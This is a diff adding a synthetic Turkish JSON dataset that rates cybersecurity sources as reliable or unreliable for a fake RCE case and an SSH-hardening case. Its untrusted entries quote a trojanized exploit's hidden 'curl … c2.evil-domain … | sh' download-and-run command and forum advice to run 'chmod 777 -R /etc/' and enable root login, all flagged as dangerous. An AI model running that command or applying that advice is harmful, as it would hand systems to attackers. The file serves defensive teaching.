@@ -1,0 +1,85 @@
+{
+  "versiyon": "2026.1",
+  "aciklama": "Sentetik Siber Guvenlik Arastirma Kaynaklari ve Guvenilirlik Veri Tabani",
+  "lisans": "OZEL LISANS - TUM HAKLARI SAKLIDIR. Telif Hakki (c) 2026 Seydi Eryilmaz (@seydivakkas)",
+  "arastirma_vakalari": [
+    {
+      "vaka_id": "VAKA-CVE-RCE-01",
+      "vaka_konusu": "CVE-2024-9999 Kritik Uzaktan Kod Calistirma (RCE) Analizi",
+      "hedef_varlik": "Kurumsal Sinir Guvenlik Duvari ve VPN Ag Gecidi",
+      "kaynaklar": [
+        {
+          "kaynak_id": "SRC-NVD-OFFICIAL",
+          "kaynak_adi": "NIST National Vulnerability Database (NVD) & Uretici MSRC Guvenlik Bulteni",
+          "kaynak_turu": "RESMI_BIRINCIL_BELGE",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-9999",
+          "yayin_tarihi": "2026-10-20T10:00:00Z",
+          "yazar_kurum": "NIST / MITRE / Vendor Security Response Center",
+          "alan_adi_guvenilirligi": "UST_DUZEY_DEVLET_URETICI",
+          "kriptografik_dogrulama": {
+            "gpg_imzali_mi": true,
+            "sha256_saglanmis_mi": true,
+            "resmi_hash": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0"
+          },
+          "icerik_ozeti": "Bellek tasmasi kaynakli RCE zafiyeti. Cozum: 12.4.2 surumune derhal guncelleme.",
+          "onerilen_eylem": "Resmî üretici yamasını doğrulanmış SHA-256 ile test ortamında uygulayınız."
+        },
+        {
+          "kaynak_id": "SRC-GITHUB-ANON-POC",
+          "kaynak_adi": "Anonim GitHub Deposu: 'CVE-2024-9999-1day-exploit-auto-pwn'",
+          "kaynak_turu": "DOGRULANMAMIS_TOPLULUK_KODU",
+          "url": "https://github.com/shadow-hacker-2026/CVE-2024-9999-exploit",
+          "yayin_tarihi": "2026-10-21T03:15:00Z",
+          "yazar_kurum": "Anonim / 0 Takipçi / Yeni Açılmış Profil",
+          "alan_adi_guvenilirligi": "HALKA_ACIK_KULLANICI_ICERIGI",
+          "kriptografik_dogrulama": {
+            "gpg_imzali_mi": false,
+            "sha256_saglanmis_mi": false,
+            "resmi_hash": null
+          },
+          "icerik_ozeti": "Python istismar betigi. Incelendiginde Base64 ile gizlenmis 'curl http://c2.evil-domain[.]ru/loader.sh | sh' komutu iceriyor!",
+          "onerilen_eylem": "DUR! Bu dosya bir Truva Atı (Trojanized PoC) zafiyet istismar tuzağıdır. Doğrudan siliniz."
+        }
+      ]
+    },
+    {
+      "vaka_id": "VAKA-LINUX-HARDENING-02",
+      "vaka_konusu": "SSH Servisi Root Girisi ve Sudoers Sertlestirme Kriteri",
+      "hedef_varlik": "Linux Sunucu Altyapisi ve Kimlik Dogrulama Mekanizmasi",
+      "kaynaklar": [
+        {
+          "kaynak_id": "SRC-CIS-BENCHMARK",
+          "kaynak_adi": "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0",
+          "kaynak_turu": "HAKEMLI_KURUMSAL_STANDART",
+          "url": "https://www.cisecurity.org/benchmark/ubuntu_linux",
+          "yayin_tarihi": "2026-05-15T00:00:00Z",
+          "yazar_kurum": "Center for Internet Security (CIS Consortium)",
+          "alan_adi_guvenilirligi": "ULUSLARARASI_STANDART_KURUMU",
+          "kriptografik_dogrulama": {
+            "gpg_imzali_mi": true,
+            "sha256_saglanmis_mi": true,
+            "resmi_hash": "f4567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12"
+          },
+          "icerik_ozeti": "PermitRootLogin no, PasswordAuthentication no ve sudoers NOPASSWD yasağı.",
+          "onerilen_eylem": "CIS Seviye 1 taban çizgisini uygulayınız."
+        },
+        {
+          "kaynak_id": "SRC-LEGACY-FORUM-POST",
+          "kaynak_adi": "Eski Forum Cevabi: 'Root ile baglanamiyorum acil yardim (2011)'",
+          "kaynak_turu": "ESKIMIS_DOGRULANMAMIS_FORUM",
+          "url": "http://linux-sorun-cozumleri-eski-forum.net/topic/19283",
+          "yayin_tarihi": "2011-04-12T14:20:00Z",
+          "yazar_kurum": "Kullanici_Adi: root_master_99",
+          "alan_adi_guvenilirligi": "DOGRULANMAMIS_BLOG_FORUM",
+          "kriptografik_dogrulama": {
+            "gpg_imzali_mi": false,
+            "sha256_saglanmis_mi": false,
+            "resmi_hash": null
+          },
+          "icerik_ozeti": "Cozum: 'chmod 777 -R /etc/ ve /etc/ssh/sshd_config icine PermitRootLogin yes yazin duzelir.'",
+          "onerilen_eylem": "FELAKET! Bu tavsiye sistemi tamamen savunmasiz hale getiren agir bir guvenlik zafiyetidir."
+        }
+      ]
+    }
+  ]
+}
